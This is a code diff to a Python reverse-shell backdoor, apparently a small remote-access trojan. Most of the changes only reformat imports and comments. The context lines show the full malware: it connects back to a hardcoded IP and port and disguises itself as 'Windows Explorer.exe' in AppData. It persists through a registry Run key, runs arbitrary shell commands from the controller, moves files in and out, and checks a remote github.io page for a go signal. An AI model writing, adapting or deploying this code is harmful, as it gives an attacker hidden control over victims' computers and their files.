@@ -1,12 +1,5 @@
 #!/usr/bin/python3
-import socket
-import subprocess
-import json
-import os
-import base64
-import sys
-import shutil
-import requests
+import socket , subprocess, json, os, base64,sys,shutil,requests
 
 IP = "192.168.1.95".encode('utf-8') # change this
 PORT = 4445 # change this (Integer Only)
@@ -16,10 +9,7 @@ class MotherFucker():
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
     def persistence(self):
-        """
-        Windows bullshit 
-        adds it self to registery and starts fucking arount
-        """
+        #Windows bullshit  adds it self to registery and starts fucking arount
         location = os.environ["appdata"] + "\\Windows Explorer.exe"
         if not os.path.exists(location):
             shutil.copyfile(sys.executable, location)
@@ -27,16 +17,11 @@ class MotherFucker():
             subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)
             
     def json_send(self, data):
-        """
-            Basically just dumps  output of commands   in a json  format and send it over
-        """
+        #Basically just dumps  output of commands   in a json  format and send it over
         json_data = json.dumps(data).encode('utf-8')
-        
         self.connection.send(json_data)
     def json_recv(self):
-        """
-            so basically just dumps the commands recived from client in a json  format 
-        """
+        #so basically just dumps the commands recived from client in a json  format 
         json_data = ""
         while True:
             try:
@@ -45,30 +30,22 @@ class MotherFucker():
             except ValueError:
                 continue
     def change_working_dir(self, path):
-        """
-        Changes Working directory basicly a $ cd whatever
-        """
+        #Changes Working directory basicly a $ cd whatever
         os.chdir(path)
         return "Changed dir to %s" % path
     def write_file(self, path, content):
-        """
-        Gets file from client and writes it to hard drive
-        """
+        #Gets file from client and writes it to hard drive
         with open(path, "wb") as file:
             decoded_file = base64.b64decode(content)
             file.write(decoded_file)
             return "Uploaded Successfully !"
     def read_file(self, path):
-        """
-        Gets file from hard drive and sends it to Client :)
-        """
+        #Gets file from hard drive and sends it to Client :)
         with open(path, "rb") as file:
             encoded_file = base64.b64encode(file.read())
             return encoded_file
     def execute_system_command(self, command):
-        """
-            used check_output instead of call or run or whatever else cause it actualy sends the result of command back and we can see it in Client
-        """
+        #used check_output instead of call or run or whatever else cause it actualy sends the result of command back and we can see it in Client
         try:
             return subprocess.getoutput(command, shell=True)
         except Exception as e:
@@ -103,7 +80,6 @@ class MotherFucker():
             self.json_send (cmd_rslt)
 
 def get_status():
-    #TODO: AES Encyrpt the freaking link
     s = requests.get('https://poggerpussy.github.io').text
     #status = re.sub(r"<.*?>",'', s)
     if s == "true":
